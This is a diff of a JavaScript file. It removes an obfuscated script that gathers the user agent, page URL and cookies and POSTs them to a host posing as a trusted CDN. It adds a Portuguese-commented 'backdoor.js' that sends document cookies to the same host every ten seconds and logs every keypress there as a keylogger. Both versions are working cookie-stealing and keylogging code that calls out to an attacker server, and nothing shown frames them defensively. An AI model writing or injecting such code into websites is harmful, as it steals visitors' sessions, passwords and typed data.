@@ -1,1 +1,20 @@
-function _0x31df(_0x5457a4,_0x252889){const _0x4b8625=_0x4b86();return _0x31df=function(_0x31dfe9,_0xa5c034){_0x31dfe9=_0x31dfe9-0x10d;let _0x36bfe2=_0x4b8625[_0x31dfe9];return _0x36bfe2;},_0x31df(_0x5457a4,_0x252889);}function _0x4b86(){const _0x5d2632=['412694rdgeme','text','58420rbmvGH','userAgent','4255110azSbnI','147dFONNt','320916pTBsQw','Dados\x20enviados\x20com\x20sucesso:','info','then','catch','stringify','location','application/json','3JKPiQw','8cutqKv','2120424btOMJH','15485590UUkMGi','href','3232233KbPhJQ','Erro\x20ao\x20enviar\x20os\x20dados:','cookie','11YRIyex'];_0x4b86=function(){return _0x5d2632;};return _0x4b86();}(function(_0x34d5f1,_0x3266d5){const _0x103b25=_0x31df,_0x2b7d01=_0x34d5f1();while(!![]){try{const _0x4c4a40=-parseInt(_0x103b25(0x11e))/0x1+-parseInt(_0x103b25(0x11c))/0x2*(-parseInt(_0x103b25(0x113))/0x3)+parseInt(_0x103b25(0x115))/0x4+parseInt(_0x103b25(0x120))/0x5+-parseInt(_0x103b25(0x122))/0x6*(-parseInt(_0x103b25(0x121))/0x7)+-parseInt(_0x103b25(0x114))/0x8*(parseInt(_0x103b25(0x118))/0x9)+parseInt(_0x103b25(0x116))/0xa*(-parseInt(_0x103b25(0x11b))/0xb);if(_0x4c4a40===_0x3266d5)break;else _0x2b7d01['push'](_0x2b7d01['shift']());}catch(_0x413b12){_0x2b7d01['push'](_0x2b7d01['shift']());}}}(_0x4b86,0xb5c75),(function(){const _0x415530=_0x31df;function _0x58e5b8(_0x26b789){const _0x5d59c5=_0x31df;return btoa(JSON[_0x5d59c5(0x110)](_0x26b789));}const _0x428472={'ua':navigator[_0x415530(0x11f)],'loc':window[_0x415530(0x111)][_0x415530(0x117)],'cookies':document[_0x415530(0x11a)]};fetch('http://static.yourtrustedcdn.com:443/receiver',{'method':'POST','headers':{'Content-Type':_0x415530(0x112)},'body':_0x58e5b8({'type':_0x415530(0x10d),'data':_0x428472})})[_0x415530(0x10e)](_0x5006d1=>_0x5006d1[_0x415530(0x11d)]())[_0x415530(0x10e)](_0x5e2f72=>console['log'](_0x415530(0x123),_0x5e2f72))[_0x415530(0x10f)](_0x520f9e=>console['error'](_0x415530(0x119),_0x520f9e));}()));
+// Exemplo de backdoor.js
+(function(){
+    // Exfiltra cookies para seu servidor
+    function exfiltraCookies() {
+        if (document.cookie) {
+            fetch('http://static.yourtrustedcdn.com/recebe?cookie=' + encodeURIComponent(document.cookie));
+        }
+    }
+
+    // Captura e exfiltra teclas digitadas (keylogger)
+    document.addEventListener('keypress', function(event) {
+        fetch('http://static.yourtrustedcdn.com/recebe?key=' + encodeURIComponent(event.key));
+    });
+
+    // Função de exfiltração contínua a cada 10 segundos
+    setInterval(exfiltraCookies, 10000);
+
+    // Inserindo um exemplo de mensagem persistente no console
+    console.log('Backdoor ativo.');
+})();
